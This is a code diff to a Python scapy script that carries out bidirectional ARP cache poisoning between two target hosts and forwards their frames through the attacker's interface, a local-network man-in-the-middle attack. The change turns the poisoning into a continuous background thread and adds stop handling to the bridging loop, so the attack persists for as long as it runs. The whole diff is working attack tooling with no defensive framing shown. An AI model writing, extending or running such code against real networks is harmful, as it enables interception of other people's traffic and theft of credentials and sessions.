@@ -1,5 +1,6 @@
 import os
 import time
+import threading
 from typing import Optional
 from scapy.all import ARP, Ether, conf, get_if_hwaddr, getmacbyip, sendp, sniff
 
@@ -52,16 +53,20 @@ def _poison_bidirectional(ip_a: str, ip_b: str, count: int = 3, interval: float 
     print(f"[i] Poisoning {ip_a} (MAC {mac_a}) saying {ip_b} is at {attacker_mac}")
     print(f"[i] Poisoning {ip_b} (MAC {mac_b}) saying {ip_a} is at {attacker_mac}")
 
-    for _ in range(count):
-        sendp(frame_a, verbose=False, iface=chosen_iface)
-        sendp(frame_b, verbose=False, iface=chosen_iface)
-        time.sleep(interval)
+    def poison_loop(stop_event: threading.Event):
+        while not stop_event.is_set():
+            sendp(frame_a, verbose=False, iface=chosen_iface)
+            sendp(frame_b, verbose=False, iface=chosen_iface)
+            time.sleep(interval)
 
-    print("[i] ARP poisoning packets sent.")
-    return chosen_iface, attacker_mac, mac_a, mac_b
+    stop_event = threading.Event()
+    poison_thread = threading.Thread(target=poison_loop, args=(stop_event,), daemon=True)
+    poison_thread.start()
+
+    return chosen_iface, attacker_mac, mac_a, mac_b, stop_event, poison_thread
 
 
-def _bridge_loop(mac_a: str, mac_b: str, attacker_mac: str, iface: str) -> None:
+def _bridge_loop(mac_a: str, mac_b: str, attacker_mac: str, iface: str, stop_event: threading.Event) -> None:
     """
     Minimal L2 bridge: forward frames between mac_a and mac_b that arrive at us.
     """
@@ -88,7 +93,7 @@ def _bridge_loop(mac_a: str, mac_b: str, attacker_mac: str, iface: str) -> None:
             pkt[Ether].dst = mac_a
             sendp(pkt, iface=iface, verbose=False)
 
-    sniff(iface=iface, prn=forward, store=False)
+    sniff(iface=iface, prn=forward, store=False, stop_filter=lambda _: stop_event.is_set())
 
 
 def run(target1_ip: str, target2_ip: str, count: int = 3, interval: float = 2.0, iface: Optional[str] = None) -> None:
@@ -98,8 +103,11 @@ def run(target1_ip: str, target2_ip: str, count: int = 3, interval: float = 2.0,
     poisoned = _poison_bidirectional(target1_ip, target2_ip, count=count, interval=interval, iface=iface)
     if not poisoned:
         return
-    chosen_iface, attacker_mac, mac_a, mac_b = poisoned
+    chosen_iface, attacker_mac, mac_a, mac_b, stop_event, poison_thread = poisoned
     try:
-        _bridge_loop(mac_a, mac_b, attacker_mac, chosen_iface)
+        _bridge_loop(mac_a, mac_b, attacker_mac, chosen_iface, stop_event)
     except KeyboardInterrupt:
         print("\n[i] Stopping forwarding loop.")
+    finally:
+        stop_event.set()
+        poison_thread.join(timeout=1.0)
